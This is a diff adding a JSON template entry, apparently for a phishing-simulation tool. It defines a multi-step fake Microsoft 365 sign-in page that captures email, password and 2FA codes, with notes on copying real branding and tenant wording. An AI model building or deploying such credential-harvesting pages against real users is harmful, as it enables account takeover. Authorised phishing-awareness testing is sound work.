@@ -1,0 +1,8 @@
+{
+  "name": "Microsoft 365 sign-in",
+  "description": "Two-step credential collection (email → password) with optional 2FA capture page. Placeholder branding — drop in the actual Microsoft logo asset before going live for your engagement.",
+  "pattern": "multi-step",
+  "has_2fa": true,
+  "fields": ["email", "password", "code_2fa"],
+  "placeholder_notes": "Replace [Microsoft 365] header text + add the Microsoft logo SVG/PNG to assets/. Confirm 'Stay signed in?' copy matches the version your target tenant displays."
+}
